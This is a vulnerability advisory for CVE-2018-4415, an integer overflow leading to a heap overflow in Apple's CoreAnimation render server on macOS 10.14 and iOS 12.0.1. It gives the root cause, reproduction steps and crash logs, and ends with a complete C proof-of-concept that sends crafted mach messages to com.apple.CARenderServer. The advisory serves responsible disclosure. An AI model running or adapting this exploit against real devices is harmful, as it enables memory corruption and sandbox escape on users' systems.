**Vulnerability Summary**<br>
QuartzCore ( https://developer.apple.com/documentation/quartzcore ), also known as CoreAnimation, is a framework use by macOS and iOS to build an animatable scene graph. CoreAnimation uses a unique rendering model where the grapohics operations are run in a separate process. On macOS, the process is WindowServer and on iOS the name is backboardd. Both of these process are out of sandbox and have the right to call setuid. The service name QuartzCore is usually referenced as CARenderServer. This service exists on both macOS and iOS and can be accessed from the Safarisandbox and therefore has been used for Pwn2Own on many occasions. There exists an integer overflow which can lead to heap over flow in QuartzCore on latest macOS/iOS.

**Vendor Response**<br>
“CoreAnimation Impact: An application may be able to execute arbitrary code with system privileges Description: A memory corruption issue was addressed with improved memory handling. CVE-2018-4415: Beyond Security’s SecuriTeam Secure Disclosure”

**CVE**<br>
CVE-2018-4415

**Credit**<br>
An independent Security Researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
macOS 10.14
iOS 12.0.1

**Vulnerability Details**<br>
The root cause of this vulnerability lies in QuartzCore`CA::Render::InterpolatedFunction::InterpolatedFunction function, this function does not notice the case of integer overflow. In the sections will discuss the details of this vulnerability on both macOS and iOS.

**macOS 10.14**<br>
On macOS, there is an useful API to retrive open the CARenderService named CGSCreateLayerContext(Not exists on iOS). The attacker can send messages to the service port with message id 0x9C42 or 0x9C43. When the process(server_thread, actually) receives this message of the specified message ids, it will go into a procedure like deserialization. With proper data fed the execution stream will go into function CA::Render::InterpolatedFunction::InterpolatedFunction.

<img src="https://blogs.securiteam.com/wp-content/uploads/2018/12/apple-sandbox-escape-macOS.14.png"><br>

Notice at (a) and (b) the value of these two member can be controlled by attacker(CA uses functions like CA::Render::Decoder::decode* to deserialize objects), and in CA::Render::InterpolatedFunction::allocate_storage function, these values will be used to decide the size of memory to be allocate.

<img src="https://blogs.securiteam.com/wp-content/uploads/2018/12/Apple-sandbox-Escape-listing2.png"><br>

At (d), v3 is controlled by values at (a) and (b). And v4 at (e) can also be controlled by attacker at (c). So the size of the memory to allocate is 4 * (v4 + v3). But look at (f) carefully, the third parameter passed to CA::Render::Decoder::decode_bytes is actually 4 * v3. The simplest form of CA::Render::Decoder::decode_bytes at (f) is like memcpy(v2, v8, 4 * v3) or memset(v2, 0, 4 * v3). So the heap overflow leading by integer overflow happens when 4 * (v4 + v3) overflows but 4 * v3 not. The proof combination of those attacker controlled values which can lead to proper integer overflow can be found in the exploit in the end of this advisory.
Reproduction of this issue on macOS can be done as follows:
1. clang QuartzCoreFunctionIntOverFlow.c -o
quartz_core_function_over_flow -framework CoreGraphics
2. ./quartz_core_function_over_flow

```shell
1 Thread 0 Crashed:: Dispatch queue: com.apple.main−thread
com.apple.CoreFoundation 0x00007fff332e2daf __CFBasicHashAddValue + 2077
com.apple.CoreFoundation 0x00007fff332e33f5 CFDictionarySetValue + 187
com.apple.SkyLight 0x00007fff595ebfa9 CGXPostPortNotification + 123
com.apple.SkyLight 0x00007fff595eb947 notify_handler + 73
com.apple.SkyLight 0x00007fff595eb2d9 post_port_data + 237
com.apple.SkyLight 0x00007fff595eafba run_one_server_pass + 949
com.apple.SkyLight 0x00007fff595eab90 CGXRunOneServicesPass + 460
com.apple.SkyLight 0x00007fff595eb820 server_loop + 96
com.apple.SkyLight 0x00007fff595eb7b5 SLXServer + 1153
WindowServer 0x000000010011d4c4 0x10011c000 + 5316
libdyld.dylib 0x00007fff6036ced5 start + 1
Thread 2:: com.apple.coreanimation.render−server // CARenderServer thread
libsystem_platform.dylib 0x00007fff6056ce09 _platform_bzero$VARIANT$Haswell
+ 41
com.apple.QuartzCore 0x00007fff3e8ebaa4 CA::Render::Decoder::
decode_bytes(void*, unsigned long) + 46
com.apple.QuartzCore 0x00007fff3e8c35f7 CA::Render::InterpolatedFunction
::InterpolatedFunction(CA::Render::Decoder*) + 191
com.apple.QuartzCore 0x00007fff3e8c3524 CA::Render::Function::decode(CA
::Render::Decoder*) + 224
com.apple.QuartzCore 0x00007fff3e8ecb8a CA::Render::Decoder::
decode_object(CA::Render::Type) + 946
com.apple.QuartzCore 0x00007fff3e8edc8e CA::Render::decode_commands(CA::
Render::Decoder*) + 871
com.apple.QuartzCore 0x00007fff3e896422 CA::Render::Server::
ReceivedMessage::run_command_stream() + 748
com.apple.QuartzCore 0x00007fff3e73d2e1 CA::Render::Server::
server_thread(void*) + 1841
com.apple.QuartzCore 0x00007fff3e91427c thread_fun(void*) + 25
libsystem_pthread.dylib 0x00007fff60572795 _pthread_body + 159
libsystem_pthread.dylib 0x00007fff605726e2 _pthread_start + 70
libsystem_pthread.dylib 0x00007fff605722a9 thread_start + 13
```

**iOS 12.0.1**<br>
Since the root cause of this issue is apparent and the code on iOS and macOS is almost the same. In this section We will only discuss the different points between iOS and macOS.
• There isn’t any API like CGSCreateLayerContext on macOS that can get the CoreAnimation rendering context directly, but through exploring we found the MIG function _XRegisterClient can be used to replace CGSCreateLayerContext. First, attacker should open the service com.apple.CARenderServer(Can be accessed from sandbox), and then call _XRegisterClient by mach_msg with message id 40202.
* To reproruce this issue on iOS 12 beta, you should use latest 1Xcode-beta(For latest SDK).
* You should import IOKit framework headers according www.malhal.com. Note that the destination directories should be changed to your Xcode-beta Application.
* The code lies in function application didFinishLaunchingWithOptions, and will be triggerd when the application starts.
* When the Application has been installed, just start the applicationios-sbe.

```shell
1 Thread 3 name: com.apple.coreanimation.render−server // CARenderServer thread
2 Thread 3:
0 libsystem_platform.dylib 0x000000018fefe584 0x18fef6000 + 34180
1 QuartzCore 0x0000000194a6e1d4 0x19491e000 + 1376724
2 QuartzCore 0x0000000194a21a58 0x19491e000 + 1063512
3 QuartzCore 0x0000000194a710b8 0x19491e000 + 1388728
4 QuartzCore 0x0000000194a719c0 0x19491e000 + 1391040
5 QuartzCore 0x00000001949fb140 0x19491e000 + 905536
6 QuartzCore 0x00000001949facdc 0x19491e000 + 904412
7 QuartzCore 0x0000000194ab65c8 0x19491e000 + 1672648
8 libsystem_pthread.dylib 0x000000018ff0c26c 0x18ff01000 + 45676
9 libsystem_pthread.dylib 0x000000018ff0c1b0 0x18ff01000 + 45488
10 libsystem_pthread.dylib 0x000000018ff0fd20 0x18ff01000 + 60704
Thread 13 name: Dispatch queue: com.apple.libdispatch−manager
Thread 13 Crashed:
0 libdispatch.dylib 0x000000018fd18514 0x18fcca000 + 320788
1 libdispatch.dylib 0x000000018fd1606c 0x18fcca000 + 311404
2 libdispatch.dylib 0x000000018fd1606c 0x18fcca000 + 311404
3 libdispatch.dylib 0x000000018fd0f1ac 0x18fcca000 + 283052
4 libsystem_pthread.dylib 0x000000018ff0d078 0x18ff01000 + 49272
5 libsystem_pthread.dylib 0x000000018ff0fd18 0x18ff01000 + 60696
```

**Exploit**<br>
```c
/**
 *  Brief: Integer overflow in CoreAnimation, CVE-2018-4415
 *  Usage:
 *    1. clang FunctionIntOverFlow.c -o function_over_flow
 *    2. ./function_over_flow
 *
 *  Specifically, `CA::Render::InterpolatedFunction::allocate_storage` function in QuartzCore does
 *  not do any check for integer overflow in expression |result = (char *)malloc(4 * (v4 + v3));|.
 *
 *  The bug has been fixed in macOS 10.14.1 and iOS 12.1, since the interfaces and structure of
 *  messages are inconsistent between different versions, this PoC may only work on macOS 10.14 and
 *  iOS 12.0, but it's very easy to replant it to another versions.
 *
 *  Tips for debugging on macOS: Turn Mac to sleep mode and ssh to the target machine, this may
 *  help you concentrate on your work.
 *
 *  One more: Mach service com.apple.CARenderServer is reacheable from Safari sandbox on both macOS
 *  and iOS. com.apple.windowserver.active accurately on macOS versions prior to macOS 10.14.
 */
#include <dlfcn.h>
#include <mach/mach.h>
#include <stdio.h>
#include <unistd.h>
static void do_int_overflow() {
    mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;
    task_get_bootstrap_port(mach_task_self(), &bs_port);
    const char *render_service_name = "com.apple.CARenderServer";
    kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) =
        dlsym(RTLD_DEFAULT, "bootstrap_look_up");
    kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &p);
    if (kr != KERN_SUCCESS) {
        printf("[-] Cannot get service of %s, %s!\n", render_service_name, mach_error_string(kr));
        return;
    }
    typedef struct quartz_register_client_s quartz_register_client_t;
    struct quartz_register_client_s {
        mach_msg_header_t header;
        uint32_t body;
        mach_msg_port_descriptor_t ports[4];
        char padding[12];
    };
    quartz_register_client_t msg_register;
    memset(&msg_register, 0, sizeof(msg_register));
    msg_register.header.msgh_bits =
        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |
        MACH_MSGH_BITS_COMPLEX;
    msg_register.header.msgh_remote_port = p;
    msg_register.header.msgh_local_port = mig_get_reply_port();
    msg_register.header.msgh_id = 40202;  // _XRegisterClient
    msg_register.body = 4;
    msg_register.ports[0].name = mach_task_self();
    msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;
    msg_register.ports[1].name = mach_task_self();
    msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;
    msg_register.ports[2].name = mach_task_self();
    msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;
    msg_register.ports[3].name = mach_task_self();
    msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;
    kr = mach_msg(&msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,
                  sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),
                  msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("[-] Send message failed: %s\n", mach_error_string(kr));
        return;
    }
    mach_port_t context_port = *(uint32_t *)((uint8_t *)&msg_register + 0x1c);
    uint32_t conn_id = *(uint32_t *)((uint8_t *)&msg_register + 0x30);
    typedef struct quartz_function_int_overflow_s quartz_function_int_overflow_t;
    struct quartz_function_int_overflow_s {
        mach_msg_header_t header;
        char msg_body[0x60];
    };
    quartz_function_int_overflow_t function_int_overflow_msg = {0};
    function_int_overflow_msg.header.msgh_bits =
        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    function_int_overflow_msg.header.msgh_remote_port = context_port;
    function_int_overflow_msg.header.msgh_id = 40002;
    memset(function_int_overflow_msg.msg_body, 0x0, sizeof(function_int_overflow_msg.msg_body));
    *(uint32_t *)(function_int_overflow_msg.msg_body + 0) = 0x1;  // Ports count
    /**
     *	1. One port consumes 12B space
     *	2. This `mach_msg` routine dose not need a port, so set this port to MACH_PORT_NULL(memory
     *	   cleared by memset)
     */
    *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 0) = 0xdeadbeef;
    *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 4) = conn_id;
    *(int8_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16) = 2;
    *(uint64_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 1) = 0xdeadbeefdeadbeef;
    *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 9) = 0xffffffff;
    *(uint8_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 13) = 0x12;  // Decode Function
    *(uint8_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 14) = 0x2;
    /**(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 15) = 0xDECAFBAD;*/
    *(uint64_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 15) = 0x2000000000000000;
    *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 23) = 1;
    *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 27) = 2;
    *(uint8_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 31) = 1;
    kr = mach_msg(&function_int_overflow_msg.header, MACH_SEND_MSG,
                  sizeof(function_int_overflow_msg), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("[-] Send message failed: %s\n", mach_error_string(kr));
        return;
    }
    return;
}
int main() {
    do_int_overflow();
    return 0;
}
```
